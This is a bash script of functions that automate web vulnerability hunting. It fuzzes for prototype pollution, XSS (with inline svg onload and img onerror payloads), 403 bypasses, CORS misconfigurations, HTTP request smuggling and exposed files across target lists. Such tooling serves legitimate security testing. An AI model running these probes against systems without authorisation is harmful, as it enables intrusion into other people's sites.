#
# Vulnerability scanning and exploitation functions
#

# Fuzzes for Prototype Pollution vulnerabilities
# Usage: prototypefuzz
# Requires: ALLHTTP file
# Outputs: Notifications on success
prototypefuzz() {
  echo "${yellow}[+] Fuzzing for Prototype Pollution...${reset}" | notify -silent -id subs
  if [ ! -s "ALLHTTP" ]; then echo "${red}[-] ALLHTTP file not found or empty.${reset}"; return 1; fi
  cat ALLHTTP | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | grep -v "NOT" | notify -silent
}

# XSS hunter with multiple scanners
# Usage: xsshunter
# Requires: domains file
# Outputs: urldump.txt, xssvector, airixss.txt, FreqXSS.txt, XSStrike_output.log
xsshunter() {
  echo "${yellow}[+] Hunting for XSS...${reset}" | notify -silent -id xss

  # Discover URLs
  while IFS= read -r domain; do
    python3 "$WAYMORE_PATH" -i "$domain" -mode U
    cat "$TOOLS_PATH/Waymore/results/$domain/waymore.txt" | awk '{print tolower($0)}' | anew urldump.txt
  done < domains

  if [ ! -s "urldump.txt" ]; then echo "${red}[-] urldump.txt not found or empty. Cannot proceed with XSS scan.${reset}"; return 1; fi

  # Vector creation
  cat urldump.txt | uro | kxss | awk '{print $0}' | anew xssvector
  cat urldump.txt | uro | gf xss | httpx -silent | anew xssvector

  if [ ! -s "xssvector" ]; then echo "${yellow}[-] No potential XSS vectors found.${reset}"; return 1; fi

  # Scanning
  echo '[+] Scanning with Airixss...'
  cat xssvector | qsreplace '"\"><svg onload=confirm(1)>"' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew airixss.txt
  [ -s "airixss.txt" ] && notify -silent -bulk -data airixss.txt -id xss

  echo '[+] Scanning with Freq...'
  cat xssvector | qsreplace '"\"><img src=x onerror=alert(1);>"' | freq | egrep -v 'Not' | anew FreqXSS.txt
  [ -s "FreqXSS.txt" ] && notify -silent -bulk -data FreqXSS.txt -id xss

  echo '[+] Scanning with XSStrike...'
  python3 "$XSSTRIKE_PATH" -ul xssvector -d 2 --file-log-level WARNING --log-file XSStrike_output.log
  [ -s "XSStrike_output.log"] && notify -silent -data XSStrike_output.log -bulk -id xss
}

# XSS hunting with Knox
# Usage: xssknox
# Requires: waybackdata file
# Outputs: kxssresult, xssSuccess
xssknox() {
  echo "${yellow}[+] Hunting for XSS with Knox...${reset}"
  if [ ! -s "waybackdata" ]; then echo "${red}[-] waybackdata file not found or empty.${reset}"; return 1; fi
  cat waybackdata | uro | kxss | awk '{print $9}' | anew kxssresult
  if [ -s "kxssresult" ]; then
    python3 "$KNOXNL_PATH" -i kxssresult -s -o xssSuccess
    if [ -s "xssSuccess" ]; then
      echo "XSS FOUND WITH KNOXSS" | notify -silent -id xss
      notify -silent -bulk -data xssSuccess -id xss
    fi
  fi
}

# Attempts to bypass 403/401 responses
# Usage: bypass4xx
# Requires: 403HTTP file
# Outputs: dirdarResult.txt, 4xxbypass.txt
bypass4xx() {
  echo "${yellow}[+] Attempting to bypass 403/401...${reset}"
  if [ ! -s "403HTTP" ]; then echo "${red}[-] 403HTTP file not found or empty.${reset}"; return 1; fi
  cat 403HTTP | dirdar -only-ok | anew dirdarResult.txt
  if [ -s "dirdarResult.txt" ]; then
    cat dirdarResult.txt | sed -e '1,12d' | sed '/^$/d' | anew 4xxbypass.txt
    echo "[+] 4xx Bypass results found!" | notify -silent -id subs
    cat 4xxbypass.txt | notify -silent -id subs
  fi
}

# Parameters spider
# Usage: paramspider
# Requires: ALLHTTP file
# Outputs: output/*.txt, params file
paramspider() {
  echo "${yellow}[+] Spidering for parameters...${reset}"
  if [ ! -s "ALLHTTP" ]; then echo "${red}[-] ALLHTTP file not found or empty.${reset}"; return 1; fi
  xargs -a ALLHTTP -I@ sh -c "python3 $PARAMSPIDER_PATH -d @ -l high --exclude jpg,png,gif,woff,css,js,svg,woff2,ttf,eot,json"
  if [ -d "output" ]; then
    cat output/*.txt | anew params
  fi
}

# CORS misconfiguration testing
# Usage: Corstest
# Requires: roots file
# Outputs: CORSHTTP file and notifications
Corstest() {
  echo "${yellow}[+] Testing for CORS misconfigurations...${reset}"
  gf cors roots | awk -F '/' '{print $2}' | anew | httpx -silent -o CORSHTTP
  [ -s "CORSHTTP" ] && python3 "$CORSTEST_PATH" CORSHTTP -q | notify -silent
}

# HTTP Request Smuggling test
# Usage: smuggling
# Requires: hosts file
# Outputs: smuggler_op.txt
smuggling() {
  echo "${yellow}[+] Testing for HTTP Request Smuggling...${reset}"
  if [ ! -s "hosts" ]; then echo "${red}[-] hosts file not found or empty.${reset}"; return 1; fi
  cat hosts | rush -j 3 "python3 $SMUGGLER_PATH -u {}" | tee -a smuggler_op.txt
}

# Directory fuzzing with ffuf
# Usage: fufdir <target_url>
fufdir() {
  ffuf -u "$1/FUZZ" -w "$DIRS_LARGE_LIST" -mc 200,301,302,403 -t 170
}

# API endpoint fuzzing with ffuf
# Usage: fufapi <target_url>
fufapi() {
  ffuf -u "$1/FUZZ" -w "$API_WORDS_LIST" -mc 200 -t 100
}

# Extension fuzzing with ffuf
# Usage: fufextension <target_url>
fufextension() {
  ffuf -u "$1/FUZZ" -mc 200,301,302,403,401 -t 150 -w "$FFUF_EXTENSIONS_LIST" -e .php,.asp,.aspx,.jsp,.py,.txt,.conf,.config,.bak,.backup,.swp,.old,.db,.sql,.json,.xml,.log,.zip
}

# Directory fuzzing with feroxbuster
# Usage: feroxdir <target_url>
feroxdir() {
  feroxbuster -u "$1" -e --status-codes 200,204,301,307,401,405,400,302 -k -w "$DIRS_LARGE_LIST"
}
